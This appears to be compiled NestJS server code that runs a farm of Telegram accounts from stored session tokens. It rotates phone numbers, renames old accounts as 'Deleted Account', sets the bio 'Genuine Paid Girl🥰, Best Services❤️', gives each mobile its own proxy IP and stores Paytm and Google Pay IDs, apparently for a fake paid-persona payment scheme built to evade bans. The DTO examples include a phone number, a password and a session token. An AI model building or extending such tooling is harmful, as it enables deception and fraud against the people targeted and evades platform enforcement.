            let updatedUsername = '';
            this.logger.log('Updating Client Session');
            const setup = this.telegramService.getActiveClientSetup();
            const { days, archiveOld, clientId, existingMobile, formalities, newMobile, } = setup;
            await (0, Helpers_1.sleep)(2000);
            const client = await this.findOne(clientId);
            await connection_manager_1.connectionManager.getClient(newMobile, {
                handler: true,
                autoDisconnect: false,
            });
            const firstName = client.name.split(' ')[0];
            const middleName = client.name.split(' ')[1];
            const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);
            const middleNameCaps = middleName
                ? middleName[0].toUpperCase() + middleName.slice(1)
                : '';
            const baseUsername = `${firstNameCaps.slice(0, 4)}${middleNameCaps.slice(0, 3)}` +
                (0, utils_1.fetchNumbersFromString)(clientId);
            try {
                updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);
            }
            catch (error) {
                (0, parseError_1.parseError)(error, 'Error in updating username', true);
            }
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);
            await connection_manager_1.connectionManager.unregisterClient(newMobile);
            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];
            const existingClient = await this.findOne(clientId);
            await this.update(clientId, {
                mobile: newMobile,
                username: updatedUsername,
                session: newSession,
            });
            await (0, fetchWithTimeout_1.fetchWithTimeout)(existingClient.deployKey, {}, 1);
            await this.bufferClientService.remove(newMobile);
            setTimeout(async () => {
                await this.updateClient(clientId, 'Delayed update after buffer removal');
            }, 15000);
            try {
                if (existingClientUser) {
                    try {
                        if ((0, utils_1.toBoolean)(formalities)) {
                            await connection_manager_1.connectionManager.getClient(existingMobile, {
                                handler: true,
                                autoDisconnect: false,
                            });
                            this.logger.log('Started Formalities');
                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);
                            await this.telegramService.deleteProfilePhotos(existingMobile);
                            await this.telegramService.updateUsername(existingMobile, '');
                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);
                            this.logger.log('Formalities finished');
                            await connection_manager_1.connectionManager.unregisterClient(existingMobile);
                            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Formalities finished`);
                        }
                        else {
                            this.logger.log('Formalities skipped');
                        }
                        if (archiveOld) {
                            const availableDate = new Date(Date.now() + (days + 1) * 24 * 60 * 60 * 1000)
                                .toISOString()
                                .split('T')[0];
                            const bufferClientDto = {
                                mobile: existingMobile,
                                availableDate,
                                session: existingClientUser.session,
                                tgId: existingClientUser.tgId,
                                channels: 170,
                                status: days > 35 ? 'inactive' : 'active',
                            };
                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);
                            this.logger.log('client Archived: ', updatedBufferClient);
                            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Client Archived`);
                        }
                        else {
                            this.logger.log('Client Archive Skipped');
                            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Client Archive Skipped`);
                        }
                    }
                    catch (error) {
                        this.logger.log('Cannot Archive Old Client');
                        const errorDetails = (0, parseError_1.parseError)(error, 'Error in Archiving Old Client', true);
                        if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), [
                            'expired',
                            'unregistered',
                            'deactivated',
                            'session_revoked',
                            'user_deactivated_ban',
                        ])) {
                            this.logger.log('Deleting User: ', existingClientUser.mobile);
                            await this.bufferClientService.remove(existingClientUser.mobile);
                        }
                        else {
                            this.logger.log('Not Deleting user');
                        }
                    }
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error, 'Error in Archiving Old Client outer', true);
                this.logger.log('Error in Archiving Old Client');
            }
            this.telegramService.setActiveClientSetup(undefined);
            this.logger.log('Update finished Exitting Exiiting TG Service');
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Update finished`);
        }
        catch (e) {
            (0, parseError_1.parseError)(e, 'Error in updating client session', true);
            this.telegramService.setActiveClientSetup(undefined);
        }
    }
    async updateClient(clientId, message = '') {
        this.logger.log(`Updating Client: ${clientId} - ${message}`);
        const now = Date.now();
        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;
        const cooldownPeriod = 30000;
        if (now - lastUpdate < cooldownPeriod) {
            this.logger.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);
            return;
        }
        const client = await this.findOne(clientId);
        try {
            this.lastUpdateMap.set(clientId, now);
            await cloudinary_1.CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());
            const telegramClient = await connection_manager_1.connectionManager.getClient(client.mobile, {
                handler: false,
            });
            await (0, Helpers_1.sleep)(2000);
            const me = await telegramClient.getMe();
            const rootPath = process.cwd();
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            if (!me.username ||
                me.username !== client.username ||
                !me.username
                    ?.toLowerCase()
                    .startsWith(me.firstName.split(' ')[0].toLowerCase())) {
                const client = await this.findOne(clientId);
                const firstName = client.name.split(' ')[0];
                const middleName = client.name.split(' ')[1];
                const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);
                const middleNameCaps = middleName
                    ? middleName[0].toUpperCase() + middleName.slice(1)
                    : '';
                const baseUsername = `${firstNameCaps.slice(0, 4)}${middleNameCaps.slice(0, 3)}` +
                    (0, utils_1.fetchNumbersFromString)(clientId);
                const updatedUsername = await telegramClient.updateUsername(baseUsername);
                await this.update(client.clientId, { username: updatedUsername });
            }
            await (0, Helpers_1.sleep)(1000);
            if (me.firstName !== client.name) {
                this.logger.log(`Updating first name for ${clientId} from ${me.firstName} to ${client.name}`);
                await telegramClient.updateProfile(client.name, `Genuine Paid Girl🥰, Best Services❤️`);
            }
            else {
                this.logger.log(`First name for ${clientId} is already up to date`);
            }
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.deleteProfilePhotos();
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.updatePrivacy();
            await (0, Helpers_1.sleep)(1000);
            this.logger.log(rootPath, 'trying to update dp');
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, Helpers_1.sleep)(1000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, Helpers_1.sleep)(1000);
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Updated Client: ${clientId} - ${message}`);
            await (0, fetchWithTimeout_1.fetchWithTimeout)(client.deployKey);
        }
        catch (error) {
            this.lastUpdateMap.delete(clientId);
            (0, parseError_1.parseError)(error);
        }
        finally {
            connection_manager_1.connectionManager.unregisterClient(client.mobile);
        }
    }
    async updateClients() {
        const clients = await this.findAll();
        for (const client of Object.values(clients)) {
            await this.updateClient(client.clientId, `Force Updating Client: ${client.clientId}`);
        }
    }
    async generateNewSession(phoneNumber, attempt = 1) {
        try {
            this.logger.log('String Generation started');
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=String Generation started for NewNumber:${phoneNumber}`);
            await (0, Helpers_1.sleep)(1000);
            const response = await (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);
            if (response) {
                this.logger.log(`Code Sent successfully`, response.data);
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Code Sent successfully`);
                await this.bufferClientService.update(phoneNumber, {
                    availableDate: new Date(Date.now() + 24 * 60 * 60 * 1000)
                        .toISOString()
                        .split('T')[0],
                });
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=Failed to send Code`);
                this.logger.log('Failed to send Code', response);
                if (attempt < 2) {
                    await (0, Helpers_1.sleep)(8000);
                    await this.generateNewSession(phoneNumber, attempt + 1);
                }
            }
        }
        catch (error) {
            this.logger.log(error);
            if (attempt < 2) {
                await (0, Helpers_1.sleep)(8000);
                await this.generateNewSession(phoneNumber, attempt + 1);
            }
        }
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.clientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getPromoteMobiles(clientId) {
        if (!clientId) {
            throw new common_1.BadRequestException('ClientId is required');
        }
        const promoteClients = await this.promoteClientModel
            .find({ clientId })
            .lean();
        return promoteClients.map((pc) => pc.mobile).filter((mobile) => mobile);
    }
    async getAllPromoteMobiles() {
        const allPromoteClients = await this.promoteClientModel
            .find({ clientId: { $exists: true } })
            .lean();
        return allPromoteClients.map((pc) => pc.mobile);
    }
    async isPromoteMobile(mobile) {
        const promoteClient = await this.promoteClientModel
            .findOne({ mobile })
            .lean();
        return {
            isPromote: !!promoteClient && !!promoteClient.clientId,
            clientId: promoteClient?.clientId,
        };
    }
    async addPromoteMobile(clientId, mobileNumber) {
        const client = await this.clientModel.findOne({ clientId }).lean();
        if (!client) {
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        }
        const existingPromoteClient = await this.promoteClientModel
            .findOne({ mobile: mobileNumber })
            .lean();
        if (existingPromoteClient) {
            if (existingPromoteClient.clientId === clientId) {
                throw new common_1.BadRequestException(`Mobile ${mobileNumber} is already a promote mobile for client ${clientId}`);
            }
            else if (existingPromoteClient.clientId) {
                throw new common_1.BadRequestException(`Mobile ${mobileNumber} is already assigned to client ${existingPromoteClient.clientId}`);
            }
            else {
                await this.promoteClientModel.updateOne({ mobile: mobileNumber }, { $set: { clientId } });
            }
        }
        else {
            throw new common_1.NotFoundException(`Mobile ${mobileNumber} not found in PromoteClient collection. Please add it first.`);
        }
        return client;
    }
    async removePromoteMobile(clientId, mobileNumber) {
        const client = await this.clientModel.findOne({ clientId }).lean();
        if (!client) {
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        }
        const result = await this.promoteClientModel.updateOne({ mobile: mobileNumber, clientId }, { $unset: { clientId: 1 } });
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Mobile ${mobileNumber} is not a promote mobile for client ${clientId}`);
        }
        return client;
    }
    async getIpForMobile(mobile, clientId) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        this.logger.debug(`Getting IP for mobile: ${mobile}${clientId ? ` (client: ${clientId})` : ''}`);
        try {
            const ipAddress = await this.ipManagementService.getIpForMobile(mobile);
            if (ipAddress) {
                this.logger.debug(`Found IP for mobile ${mobile}: ${ipAddress}`);
                return ipAddress;
            }
            this.logger.debug(`No IP found for mobile ${mobile}`);
            return null;
        }
        catch (error) {
            this.logger.error(`Failed to get IP for mobile ${mobile}: ${error.message}`, error.stack);
            return null;
        }
    }
    async hasMobileAssignedIp(mobile) {
        const ip = await this.getIpForMobile(mobile);
        return ip !== null;
    }
    async getMobilesNeedingIpAssignment(clientId) {
        this.logger.debug(`Getting mobiles needing IP assignment for client: ${clientId}`);
        const client = await this.findOne(clientId);
        const result = {
            mainMobile: undefined,
            promoteMobiles: [],
        };
        if (client.mobile && !(await this.hasMobileAssignedIp(client.mobile))) {
            result.mainMobile = client.mobile;
        }
        const promoteMobiles = await this.getPromoteMobiles(clientId);
        for (const mobile of promoteMobiles) {
            if (!(await this.hasMobileAssignedIp(mobile))) {
                result.promoteMobiles.push(mobile);
            }
        }
        this.logger.debug(`Mobiles needing IP assignment for client ${clientId}:`, result);
        return result;
    }
    async autoAssignIpsToClient(clientId) {
        this.logger.debug(`Auto-assigning IPs to all mobiles for client: ${clientId}`);
        const client = await this.findOne(clientId);
        const errors = [];
        let assigned = 0;
        let failed = 0;
        let mainMobileResult;
        try {
            const mainMapping = await this.ipManagementService.assignIpToMobile({
                mobile: client.mobile,
                clientId: client.clientId,
            });
            mainMobileResult = {
                mobile: client.mobile,
                ipAddress: mainMapping.ipAddress,
                status: 'assigned',
            };
            assigned++;
        }
        catch (error) {
            mainMobileResult = {
                mobile: client.mobile,
                ipAddress: null,
                status: 'failed',
            };
            errors.push(`Main mobile ${client.mobile}: ${error.message}`);
            failed++;
        }
        const promoteMobileResults = [];
        const promoteMobiles = await this.getPromoteMobiles(clientId);
        for (const promoteMobile of promoteMobiles) {
            try {
                const promoteMapping = await this.ipManagementService.assignIpToMobile({
                    mobile: promoteMobile,
                    clientId: client.clientId,
                });
                promoteMobileResults.push({
                    mobile: promoteMobile,
                    ipAddress: promoteMapping.ipAddress,
                    status: 'assigned',
                });
                assigned++;
            }
            catch (error) {
                promoteMobileResults.push({
                    mobile: promoteMobile,
                    ipAddress: null,
                    status: 'failed',
                });
                errors.push(`Promote mobile ${promoteMobile}: ${error.message}`);
                failed++;
            }
        }
        const totalMobiles = 1 + promoteMobiles.length;
        this.logger.log(`Auto-assignment completed for ${clientId}: ${assigned}/${totalMobiles} assigned`);
        return {
            clientId,
            mainMobile: mainMobileResult,
            promoteMobiles: promoteMobileResults,
            summary: {
                totalMobiles,
                assigned,
                failed,
                errors,
            },
        };
    }
    async getClientIpInfo(clientId) {
        this.logger.debug(`Getting IP info for client: ${clientId}`);
        const client = await this.findOne(clientId);
        const mainMobileIp = await this.getIpForMobile(client.mobile, clientId);
        const mainMobile = {
            mobile: client.mobile,
            ipAddress: mainMobileIp,
            hasIp: mainMobileIp !== null,
        };
        const promoteMobiles = [];
        let mobilesWithIp = mainMobile.hasIp ? 1 : 0;
        const clientPromoteMobiles = await this.getPromoteMobiles(clientId);
        for (const mobile of clientPromoteMobiles) {
            const ip = await this.getIpForMobile(mobile, clientId);
            const hasIp = ip !== null;
            promoteMobiles.push({
                mobile,
                ipAddress: ip,
                hasIp,
            });
            if (hasIp)
                mobilesWithIp++;
        }
        const totalMobiles = 1 + clientPromoteMobiles.length;
        const mobilesWithoutIp = totalMobiles - mobilesWithIp;
        return {
            clientId,
            clientName: client.name,
            mainMobile,
            promoteMobiles,
            dedicatedIps: client.dedicatedIps || [],
            summary: {
                totalMobiles,
                mobilesWithIp,
                mobilesWithoutIp,
            },
        };
    }
    async releaseIpFromMobile(mobile) {
        this.logger.debug(`Releasing IP from mobile: ${mobile}`);
        try {
            await this.ipManagementService.releaseIpFromMobile({ mobile });
            this.logger.log(`Successfully released IP from mobile: ${mobile}`);
            return {
                success: true,
                message: `IP released from mobile ${mobile}`,
            };
        }
        catch (error) {
            this.logger.error(`Failed to release IP from mobile ${mobile}: ${error.message}`, error.stack);
            return {
                success: false,
                message: `Failed to release IP: ${error.message}`,
            };
        }
    }
};
exports.ClientService = ClientService;
exports.ClientService = ClientService = ClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(client_schema_1.Client.name)),
    __param(1, (0, mongoose_1.InjectModel)(promote_client_schema_1.PromoteClient.name)),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => archived_client_service_1.ArchivedClientService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => ip_management_service_1.IpManagementService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        mongoose_2.Model,
        Telegram_service_1.TelegramService,
        buffer_client_service_1.BufferClientService,
        users_service_1.UsersService,
        archived_client_service_1.ArchivedClientService,
        session_manager_1.SessionService,
        ip_management_service_1.IpManagementService,
        npoint_service_1.NpointService])
], ClientService);


/***/ }),

/***/ "./src/components/clients/dto/create-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/create-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateClientDto {
}
exports.CreateClientDto = CreateClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Shruthi Reddy', description: 'Name of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '+916265240911', description: 'Phone number of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Ajtdmwajt1@', description: 'Password of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Main account of the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'booklet_10', description: 'Product associated with the user' }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "gpayId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client', required: false }),
    __metadata("design:type", Array)
], CreateClientDto.prototype, "dedicatedIps", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'US', description: 'Preferred country for IP assignment', required: false }),
    __metadata("design:type", String)
], CreateClientDto.prototype, "preferredIpCountry", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Whether to auto-assign IPs to mobile numbers', required: false }),
    __metadata("design:type", Boolean)
], CreateClientDto.prototype, "autoAssignIps", void 0);


/***/ }),

/***/ "./src/components/clients/dto/search-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/search-client.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchClientDto {
}
exports.SearchClientDto = SearchClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Database collection name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "link", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Name of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Phone number of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.Matches)(/^\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "number", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Password of the client' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Promotion Repl link of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "promoteRepl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Clientname of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "clientName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Deployment key URL' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsUrl)({}, { message: 'Invalid URL format' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "deployKey", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Main account of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "mainAccount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Product associated with the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "product", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Search by client ID that has promote mobiles assigned' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^(true|false)$/i, { message: 'hasPromoteMobiles must be either "true" or "false"' }),
    __metadata("design:type", String)
], SearchClientDto.prototype, "hasPromoteMobiles", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paytm QR ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "qrId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Google Pay ID of the client' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim()),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchClientDto.prototype, "gpayId", void 0);


/***/ }),

/***/ "./src/components/clients/dto/update-client.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/dto/update-client.dto.ts ***!
  \*********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_client_dto_1 = __webpack_require__(/*! ./create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
class UpdateClientDto extends (0, swagger_1.PartialType)(create_client_dto_1.CreateClientDto) {
}
exports.UpdateClientDto = UpdateClientDto;


/***/ }),

/***/ "./src/components/clients/schemas/client.schema.ts":
/*!*********************************************************!*\
  !*** ./src/components/clients/schemas/client.schema.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientSchema = exports.Client = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Client = class Client {
};
exports.Client = Client;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Database collection name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "dbcoll", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "link", void 0);
__decorate([
